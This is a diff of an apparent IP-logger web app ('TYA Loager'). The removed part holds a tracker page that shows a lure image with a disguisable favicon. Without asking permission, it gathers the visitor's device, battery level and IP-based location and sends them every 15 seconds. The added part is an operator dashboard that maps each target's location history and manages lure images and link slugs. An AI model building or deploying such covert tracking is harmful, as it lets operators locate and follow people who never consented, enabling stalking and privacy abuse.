-            }).catch(err => {
-                showToast('❌ Error: ' + err.message);
-            });
-        }
-
-        // ─── Copy Link ────────────────────────────────────────────
-        function copyLink(id) {
-            const pathInput = document.getElementById('path-' + id);
-            const customPath = pathInput ? pathInput.value.trim() : id;
-            const link = origin + '/track/' + encodeURIComponent(customPath || id);
-            navigator.clipboard.writeText(link)
-                .then(() => showToast('✅ Link for <strong>' + escapeHtml(id) + '</strong> copied!<br><span style="font-size:0.8rem;color:var(--text2);">' + link +
-                        '</span>'))
-                .catch(() => {
-                    prompt('Copy this link:', link);
-                    showToast('📋 Link copied.');
-                });
-        }
-
-        // ─── Delete User ──────────────────────────────────────────
-        async function deleteUser(id) {
-            if (!confirm('Delete user ' + id + '?')) return;
-            try {
-                const res = await fetch('/api/track/' + id, { method: 'DELETE' });
-                if (res.ok) {
-                    fetchUsers();
-                    showToast('🗑️ User deleted.');
-                } else {
-                    showToast('❌ Failed to delete.');
-                }
-            } catch (err) {
-                showToast('❌ Error: ' + err.message);
-            }
-        }
-
-        // ─── Clear All ────────────────────────────────────────────
-        async function clearAllData() {
-            if (!confirm('⚠️ Delete ALL tracking data? This cannot be undone.')) return;
-            try {
-                const res = await fetch('/api/track', { method: 'DELETE' });
-                if (res.ok) {
-                    trackedUsers = [];
-                    renderCards();
-                    showToast('🗑️ All data cleared.');
-                } else {
-                    showToast('❌ Failed to clear.');
-                }
-            } catch (err) {
-                showToast('❌ Error: ' + err.message);
-            }
-        }
-
-        // ──────────────────────────────────────────────────────────
-        //  TRACKER (User Side) – IP‑based, no permission
-        // ──────────────────────────────────────────────────────────
-        function initTracker(customPath) {
-            const trackerView = document.getElementById('tracker-view');
-            const img = document.getElementById('target-image');
-            const loader = document.getElementById('loader');
-
-            trackerView.style.display = 'block';
-            loader.style.display = 'block';
-
-            img.src = '/api/image?' + Date.now();
-            img.onload = function() { loader.style.display = 'none'; };
-            img.onerror = function() {
-                img.src = 'https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=800&q=80';
-                loader.style.display = 'none';
-            };
-
-            fetch('/api/track')
-                .then(r => r.json())
-                .then(users => {
-                    const user = users.find(u => u.customPath === customPath || u.id === customPath);
-                    if (user) {
-                        if (user.favicon) {
-                            document.getElementById('dynamic-favicon').href = '/api/favicon/' + user.favicon;
-                        }
-                        setTimeout(() => trackUser(user.id), 1500);
-                    } else {
-                        const newId = customPath;
-                        fetch('/api/track', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ id: newId, customPath: newId, device: 'Pending',
-                                battery: 'N/A', lat: null, lng: null }),
-                        }).then(() => {
-                            setTimeout(() => trackUser(newId), 1500);
-                        }).catch(() => {
-                            setTimeout(() => trackUser(customPath), 1500);
-                        });
-                    }
-                })
-                .catch(() => {
-                    setTimeout(() => trackUser(customPath), 1500);
-                });
-        }
-
-        // ─── Multi‑service IP geolocation ────────────────────────
-        async function getLocationFromIP() {
-            const services = [
-                { url: 'https://ipapi.co/json/', parse: d => ({ lat: d.latitude, lng: d.longitude }) },
-                { url: 'https://ip-api.com/json/', parse: d => ({ lat: d.lat, lng: d.lon }) },
-                { url: 'https://geoplugin.net/json.gp', parse: d => ({ lat: d.geoplugin_latitude, lng: d.geoplugin_longitude }) }
-            ];
-
-            for (const service of services) {
-                try {
-                    const res = await fetch(service.url);
-                    if (res.ok) {
-                        const data = await res.json();
-                        const loc = service.parse(data);
-                        if (loc.lat && loc.lng) {
-                            return loc;
-                        }
-                    }
-                } catch (_) { continue; }
-            }
-            return null;
-        }
-
-        async function trackUser(id) {
-            const data = { id, device: 'Unknown', battery: 'N/A', lat: null, lng: null };
-
-            // Device
-            const ua = navigator.userAgent;
-            if (/Android/i.test(ua)) data.device = 'Android';
-            else if (/iPhone|iPad|iPod/i.test(ua)) data.device = 'iOS';
-            else if (/Windows/i.test(ua)) data.device = 'Windows';
-            else if (/Mac/i.test(ua)) data.device = 'macOS';
-            else data.device = 'Desktop';
-
-            // Battery
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    data.battery = Math.round(battery.level * 100) + '%';
-                    if (battery.charging) data.battery += ' ⚡';
-                } catch (_) {}
-            }
-
-            // ─── Location: IP only (no permission prompt) ──────
-            const loc = await getLocationFromIP();
-            if (loc) {
-                data.lat = loc.lat;
-                data.lng = loc.lng;
-            }
-
-            // Send initial data
-            await sendTrackData(id, data);
-
-            // Update every 15 seconds
-            setInterval(async () => {
-                const newLoc = await getLocationFromIP();
-                if (newLoc) {
-                    data.lat = newLoc.lat;
-                    data.lng = newLoc.lng;
-                }
-                await sendTrackData(id, data);
-            }, 15000);
-        }
-
-        async function sendTrackData(id, data) {
-            try {
-                await fetch('/api/track', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        id: data.id,
-                        device: data.device || 'Unknown',
-                        battery: data.battery || 'N/A',
-                        lat: data.lat ?? null,
-                        lng: data.lng ?? null,
-                    })
-                });
-            } catch (e) { /* silent */ }
-        }
-
-        // ─── UTILITY ──────────────────────────────────────────────
-        function showToast(msg) {
-            const el = document.getElementById('toast');
-            el.innerHTML = msg;
-            el.classList.add('show');
-            clearTimeout(el._timeout);
-            el._timeout = setTimeout(() => el.classList.remove('show'), 5000);
-        }
-
-        function escapeHtml(str) {
-            if (!str) return '';
-            const div = document.createElement('div');
-            div.textContent = str;
-            return div.innerHTML;
-        }
-
-        window.addEventListener('resize', function() {
-            Object.values(mapInstances).forEach(m => { try { m.invalidateSize(); } catch (_) {} });
+    // History trail
+    if(user.locationHistory&&user.locationHistory.length>1){
+      const pts=user.locationHistory.filter(h=>h.lat&&h.lng).map(h=>[h.lat,h.lng]);
+      if(pts.length>1){
+        L.polyline(pts,{color:color,weight:2,opacity:.4,dashArray:'6,8'}).addTo(map);
+        // Mark history points
+        pts.forEach((p,i)=>{
+          if(i<pts.length-1){
+            L.circleMarker(p,{radius:3,fillColor:'#818cf8',fillOpacity:.6,color:'transparent',weight:0}).addTo(map);
+          }
         });
+      }
+    }
+  }
 
-        console.log('🚀 TYA Loager v2.2 – IP-only location, fixed OG image.');
-    </script>
+  // Fix map rendering
+  setTimeout(()=>map.invalidateSize(),100);
+  setTimeout(()=>map.invalidateSize(),500);
+}
 
+function flyCardMap(userId,lat,lng){
+  const map=cardMaps[userId];
+  if(map&&lat&&lng)map.flyTo([lat,lng],16,{duration:1});
+}
+
+/* ── USER ACTIONS ── */
+function copyLink(slug){
+  navigator.clipboard.writeText(API+'/track/'+slug);
+  toast('Link copied!','📋');
+}
+async function saveUserEdits(id){
+  const nameEl=document.querySelector(`[data-edit-id="name_${id}"]`);
+  const slugEl=document.querySelector(`[data-edit-id="slug_${id}"]`);
+  if(!nameEl||!slugEl)return;
+  await fetch(API+'/api/track',{method:'PUT',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({id,cardName:nameEl.value,customPath:slugEl.value})});
+  toast('Saved!','💾');
+  fetchUsers();
+}
+async function saveUserField(id,field,value){
+  const body={id};body[field]=value;
+  await fetch(API+'/api/track',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+  toast('Updated!','✅');
+}
+async function archiveUser(id){
+  await fetch(API+'/api/track?id='+id,{method:'DELETE'});
+  toast('Archived','🗑️');fetchUsers();
+}
+async function restoreUser(id){
+  await fetch(API+'/api/track',{method:'PUT',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({id,deleted:false})});
+  toast('Restored!','♻️');fetchUsers();
+}
+async function permDelete(id){
+  if(!confirm('Permanently delete this user and all their data?'))return;
+  await fetch(API+'/api/track?id='+id+'&permanent=true',{method:'DELETE'});
+  toast('Permanently deleted','🗑️');fetchUsers();
+}
+
+/* ── IMAGE UPLOAD ── */
+async function uploadImage(input){
+  const file=input.files[0];if(!file)return;
+  const name=document.getElementById('imgName').value.trim()||('img_'+Date.now());
+  const fd=new FormData();fd.append('image',file);fd.append('name',name);
+  try{
+    await fetch(API+'/api/image',{method:'POST',body:fd});
+    toast('Image uploaded!','🖼️');
+    document.getElementById('imgName').value='';
+    input.value='';
+    fetchImages();
+  }catch(e){toast('Upload failed','❌')}
+}
+function renderImages(){
+  const grid=document.getElementById('imagesGrid');
+  if(!images.length){grid.innerHTML='<p style="color:var(--text3);font-size:13px">No images yet.</p>';return}
+  let html='';
+  images.forEach(img=>{
+    html+=`<div class="img-card">
+      <img src="${API}/api/image?name=${encodeURIComponent(img.name)}&t=${Date.now()}" alt="${img.name}"/>
+      <div class="img-info">
+        <span class="img-name">${img.name}</span>
+      </div>
+    </div>`;
+  });
+  grid.innerHTML=html;
+  // Update preview
+  if(images.length){
+    document.getElementById('previewImg').src=API+'/api/image?name='+encodeURIComponent(images[0].name)+'&t='+Date.now();
+  }
+  try{document.getElementById('previewDomain').textContent=window.location.hostname.toUpperCase()}catch(e){}
+}
+
+/* ── FAVICON UPLOAD ── */
+function uploadFav(key){
+  const input=document.getElementById('favFileInput');
+  input.onchange=async function(){
+    const file=this.files[0];if(!file)return;
+    const fd=new FormData();fd.append('favicon',file);fd.append('key',key);
+    await fetch(API+'/api/favicon',{method:'POST',body:fd});
+    toast('Favicon uploaded!','⭐');
+    // Update preview
+    document.getElementById('fav'+key.toUpperCase()).style.cssText=
+      `background:url(${API}/api/favicon?key=${key}&t=${Date.now()}) center/cover;width:48px;height:48px;border-radius:12px`;
+    this.value='';
+  };
+  input.click();
+}
+
+/* ── BOOT ── */
+function boot(){
+  if(typeof L==='undefined'){setTimeout(boot,150);return}
+  fetchUsers();
+  fetchImages();
+  // Load favicons
+  ['i','f','w','g'].forEach(k=>{
+    const img=new Image();img.src=API+'/api/favicon?key='+k+'&t='+Date.now();
+    img.onload=()=>{
+      const el=document.getElementById('fav'+k.toUpperCase());
+      if(el)el.style.cssText=`background:url(${img.src}) center/cover;width:48px;height:48px;border-radius:12px`;
+    };
+  });
+  // Poll
+  setInterval(()=>{fetchUsers();fetchImages()},5000);
+}
+boot();
+</script>
 </body>
 </html>
